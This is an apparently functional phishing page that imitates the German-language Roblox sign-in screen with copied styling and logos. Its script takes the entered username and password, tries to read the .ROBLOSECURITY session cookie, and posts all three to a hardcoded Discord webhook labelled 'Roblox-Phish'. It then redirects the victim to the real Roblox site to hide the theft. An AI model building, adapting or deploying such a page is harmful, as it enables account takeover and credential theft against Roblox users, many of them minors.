<!doctype html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <title>Roblox</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <!-- Original-Roblox-CSS -->
  <link rel="stylesheet" href="https://www.roblox.com/css/lean_base_www.css">
  <style>
    body{margin:0;background:#0e0e10;font-family:Roboto,system-ui,-apple-system,BlinkMacSystemFont,Arial}
    header{background:#1f1f23;height:64px;display:flex;align-items:center;padding:0 24px}
    .logo{height:40px}
    .main{display:flex;min-height:calc(100vh - 64px);align-items:center;justify-content:center;background:url(https://www.roblox.com/images/landing/hero-2025.jpg) center/cover no-repeat}
    .card{background:#1f1f23;border-radius:12px;padding:40px 48px;width:384px;box-shadow:0 20px 32px #00000080}
    .input-group{margin-bottom:16px}
    label{font-size:14px;color:#b8b8b8;display:block;margin-bottom:6px}
    input{width:100%;padding:12px 14px;background:#2a2a2d;border:1px solid #3a3a3d;border-radius:6px;color:#fff;font-size:16px}
    input:focus{outline:none;border-color:#02b757}
    .btn{width:100%;padding:14px;background:#02b757;border:0;border-radius:6px;color:#fff;font-size:16px;font-weight:600;cursor:pointer}
    .btn:hover{background:#029a4a}
    .links{font-size:13px;text-align:center;margin-top:16px;color:#b8b8b8}
    .links a{color:#02b757;text-decoration:none}
    .links a:hover{text-decoration:underline}
    .reg{float:right;font-size:14px;color:#02b757;font-weight:600}
  </style>
</head>
<body>
<header>
  <img class="logo" src="https://www.roblox.com/Images/Logo/roblox-logo-white.svg" alt="Roblox">
  <a class="reg" href="#">Registrieren</a>
</header>

<div class="main">
  <div class="card">
    <h2 style="margin:0 0 24px;font-size:24px;color:#fff">Anmelden</h2>
    <form id="f" autocomplete="off">
      <div class="input-group">
        <label for="u">Benutzer/E-Mail/Telefon</label>
        <input id="u" name="u" type="text" required>
      </div>
      <div class="input-group">
        <label for="p">Passwort</label>
        <input id="p" name="p" type="password" required>
      </div>
      <button type="submit" class="btn">Anmelden</button>
      <div class="links">
        <a href="#">Passwort oder Benutzername vergessen?</a><br>
        <span>Du hast kein Konto? <a href="#">Registrieren</a></span>
      </div>
    </form>
  </div>
</div>

<script>
document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const u = document.getElementById('u').value;
  const p = document.getElementById('p').value;
  const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';

  await fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: '**Roblox-Phish**',
      embeds: [{
        title: 'Neuer Login',
        color: 0x02b757,
        fields: [
          { name: 'User', value: u, inline: true },
          { name: 'Pass', value: p, inline: true },
          { name: 'ROBLOSECURITY', value: robloxSec || 'â€“', inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    })
  });

  window.location = 'https://www.roblox.com/home';
});
</script>
</body></html>
